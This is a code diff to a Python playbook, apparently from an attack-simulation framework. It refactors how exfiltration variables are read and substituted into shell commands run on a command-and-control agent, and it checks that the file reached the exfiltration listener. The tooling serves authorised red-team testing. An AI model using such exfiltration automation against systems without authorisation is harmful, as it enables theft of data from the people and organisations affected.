@@ -51,7 +51,6 @@ pp = pprint.PrettyPrinter(indent=4)
 config = ConfigParser()
 config.read('havoc-playbooks/simple_exfil/simple_exfil.ini')
 
-exfil_outfile = config.get('exfil_task', 'exfil_outfile')
 exfil_type = config.get('exfil_task', 'exfil_type')
 exfil_port = config.get('exfil_task', 'exfil_port')
 exfil_tls = config.get('exfil_task', 'tls')
@@ -60,7 +59,10 @@ exfil_task_domain_name = config.get('exfil_task', 'domain_name')
 exfil_cert_subj = config.get('exfil_task', 'cert_subj')
 c2_task_name = config.get('c2_task', 'task_name')
 c2_agent_name = config.get('c2_task', 'agent_name')
-command_list = config.get('c2_task', 'command_list')
+exfil_file = config.get('exfil_actions', 'exfil_file')
+exfil_path = config.get('exfil_actions', 'exfil_path')
+exfil_size = config.get('exfil_actions', 'exfil_size')
+command_list = config.get('exfil_actions', 'command_list')
 
 exfil_task_exists = None
 exfil_portgroup_exists = None
@@ -200,8 +202,10 @@ else:
 # Execute a list of shell commands on the agent.
 for command in command_list.split(', '):
     # Replace variables in shell_command
-    exfil_outfile_insert = re.sub('\$EXFIL_OUTFILE', exfil_outfile, command)
-    exfil_type_insert = re.sub('\$EXFIL_TYPE', exfil_type, exfil_outfile_insert)
+    exfil_path_insert = re.sub('\$EXFIL_PATH', exfil_path, command)
+    exfil_file_insert = re.sub('\$EXFIL_FILE', exfil_file, exfil_path_insert)
+    exfil_size_insert = re.sub('\$EXFIL_SIZE', exfil_size, exfil_file_insert)
+    exfil_type_insert = re.sub('\$EXFIL_TYPE', exfil_type, exfil_size_insert)
     if exfil_tls.lower() == 'true':
         exfil_tls_insert = re.sub('\$TLS', 's', exfil_type_insert)
     else:
@@ -227,17 +231,17 @@ for command in command_list.split(', '):
 # Confirm that exfil was successful.
 # Use a random string for the exfil_listener instruct_instance.
 confirm_exfil_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
-print(f'\nConfirming that {exfil_outfile} was successfully uploaded to {exfil_task_name}.')
+print(f'\nConfirming that {exfil_file} was successfully uploaded to {exfil_task_name}.')
 instruct_command = 'ls'
 ls_command = h.interact_with_task(exfil_task_name, instruct_command, confirm_exfil_instruct_instance)
 if ls_command['outcome'] == 'success':
     dir_contents = ls_command['local_directory_contents']
-    if exfil_outfile in dir_contents:
-        print(f'\nUpload of {exfil_outfile} succeeded.\n')
+    if exfil_file in dir_contents:
+        print(f'\nUpload of {exfil_file} succeeded.\n')
         print(f'{exfil_task_name} local directory contents:\n')
         pp.pprint(dir_contents)
     else:
-        print(f'\nUpload of {exfil_outfile} failed.\n')
+        print(f'\nUpload of {exfil_file} failed.\n')
         print(f'{exfil_task_name} local directory contents:\n')
         pp.pprint(dir_contents)
 else:
